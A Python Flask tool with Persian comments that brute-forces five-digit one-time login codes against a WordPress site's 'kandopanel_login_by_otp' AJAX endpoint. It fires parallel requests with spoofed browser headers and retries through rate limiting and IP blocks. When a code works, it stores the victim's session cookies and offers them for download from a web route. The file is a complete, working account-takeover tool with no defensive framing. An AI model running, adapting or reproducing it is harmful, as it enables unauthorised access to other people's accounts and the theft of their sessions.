import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from flask import Flask, render_template_string, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import threading
import os
from datetime import datetime

app = Flask(__name__)
socketio = SocketIO(app)

# متغیرهای گلوبال برای کنترل پروسه و وضعیت
running = False
found_success = False
progress_log = []
current_status = {
    "running": False,
    "current_range": {"start": 0, "end": 0},
    "processed": 0,
    "error": None
}
last_cookie_file = None  # برای ذخیره مسیر آخرین فایل کوکی
stop_event = threading.Event()  # برای توقف فوری همه نخ‌ها

def save_cookies(cookies, code_str):
    """ذخیره کوکی‌ها و برگردوندن لینک"""
    global last_cookie_file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
    
    cookie_jar = MozillaCookieJar(cookies_file)
    for cookie in cookies:
        cookie_jar.set_cookie(cookie)
    cookie_jar.save(ignore_discard=True, ignore_expires=True)
    
    if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
        progress_log.append(f"Cookies saved in {cookies_file}")
        print(f"Cookies saved in {cookies_file}")  # لاگ به ترمینال
        last_cookie_file = cookies_file
        return True
    else:
        progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
        print(f"Error: Failed to save cookies to {cookies_file}")  # لاگ به ترمینال
        return False

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
    global current_status, last_cookie_file, found_success, running
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        if stop_event.is_set():  # اگه موفقیت پیدا شده، متوقف شو
            return False
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status()
            try:
                json_response = response.json()
                print(f"Response for code {code_str}: {json_response}")  # لاگ پاسخ سرور
                if json_response.get("success"):
                    msg = (f"Success with code {code_str} (number {counter})!\n"
                           f"Message: {json_response['data']['message']}\n"
                           f"Redirect to: {json_response['data']['redirect']}")
                    progress_log.append(msg)
                    print(msg)  # لاگ به ترمینال
                    save_cookies(response.cookies, code_str)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"success_{code_str}_{timestamp}.txt"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(msg + "\nLast cookie file will be available after process stops.\n")
                    progress_log.append(f"Output saved in {output_file}")
                    print(f"Output saved in {output_file}")  # لاگ به ترمینال
                    current_status["error"] = f"Code {code_str} found successfully!"
                    current_status["running"] = False
                    found_success = True
                    running = False
                    stop_event.set()  # سیگنال توقف به همه نخ‌ها
                    return True
                else:
                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
                    print(f"Failed with code {code_str} (number {counter}): {json_response}")  # لاگ به ترمینال
                    current_status["processed"] = counter
                    return False
            except json.JSONDecodeError:
                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
                print(f"Error parsing JSON for code {code_str} (number {counter})")  # لاگ به ترمینال
                current_status["error"] = "JSON parsing error"
                return False
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if isinstance(e, requests.exceptions.HTTPError):
                if e.response.status_code == 429:
                    error_msg = "Rate Limit exceeded (429)"
                elif e.response.status_code == 403:
                    error_msg = "IP blocked by server (403)"
                elif e.response.status_code == 503:
                    error_msg = "Server unavailable (503)"
            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
            print(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")  # لاگ به ترمینال
            current_status["error"] = error_msg
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
    global running, found_success, current_status
    stop_event.clear()  # ریست سیگنال توقف
    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
    print(f"Starting bruteforce from {start_range} to {end_range}...")  # لاگ به ترمینال
    current_status = {
        "running": True,
        "current_range": {"start": start_range, "end": end_range},
        "processed": start_range,
        "error": None
    }
    batch_size = connections
    found_success = False

    for batch_start in range(start_range, end_range, batch_size):
        if not running or found_success or stop_event.is_set():
            if found_success or stop_event.is_set():
                cookie_link = f"http://{request.host}/last_cookie"  # لینک توی context اصلی
                success_msg = (f"Code found successfully! Process stopped.\n"
                               f"Last cookie: {cookie_link}")
                progress_log.append(success_msg)
                print(success_msg)  # لاگ به ترمینال
                current_status["error"] = success_msg
            else:
                progress_log.append("Process stopped manually!")
                print("Process stopped manually!")  # لاگ به ترمینال
            current_status["running"] = False
            break

        batch_end = min(batch_start + batch_size, end_range)
        codes = [generate_code(i) for i in range(batch_start, batch_end)]

        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = {
                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
                for idx, code in enumerate(codes)
            }

            for future in futures:
                try:
                    if future.result():
                        found_success = True
                        running = False
                        break  # توقف حلقه داخلی
                except Exception as e:
                    progress_log.append(f"Exception in future: {str(e)}")
                    print(f"Exception in future: {str(e)}")  # لاگ به ترمینال
                    current_status["error"] = str(e)

        if found_success or stop_event.is_set():
            break  # توقف حلقه اصلی

        current_status["processed"] = batch_end
        if not found_success:
            time.sleep(0.1)

    if not found_success:
        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")  # لاگ به ترمینال
        current_status["running"] = False
    # ریست برای کار بعدی
    running = False
    found_success = False

@app.route('/start', methods=['POST'])
def start():
    global running, progress_log, found_success
    data = request.get_json()
    host = data['host']
    login_otp_nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    start_range = int(data['startRange'])
    end_range = int(data['endRange'])

    running = True
    found_success = False
    progress_log = []
    progress_log.append("Start button clicked!")
    print("Start button clicked!")  # لاگ به ترمینال
    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    stop_event.set()  # سیگنال توقف دستی
    progress_log.append("Stop button clicked!")
    print("Stop button clicked!")  # لاگ به ترمینال
    return '', 204

@app.route('/status', methods=['GET'])
def status():
    """برگشت وضعیت فعلی ورکر"""
    return jsonify(current_status)

@app.route('/last_cookie', methods=['GET'])
def last_cookie():
    """نمایش یا دانلود آخرین فایل کوکی"""
    global last_cookie_file
    if last_cookie_file and os.path.exists(last_cookie_file):
        return send_file(last_cookie_file, as_attachment=True, download_name=os.path.basename(last_cookie_file))
    else:
        return "No successful cookie found yet!", 404

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
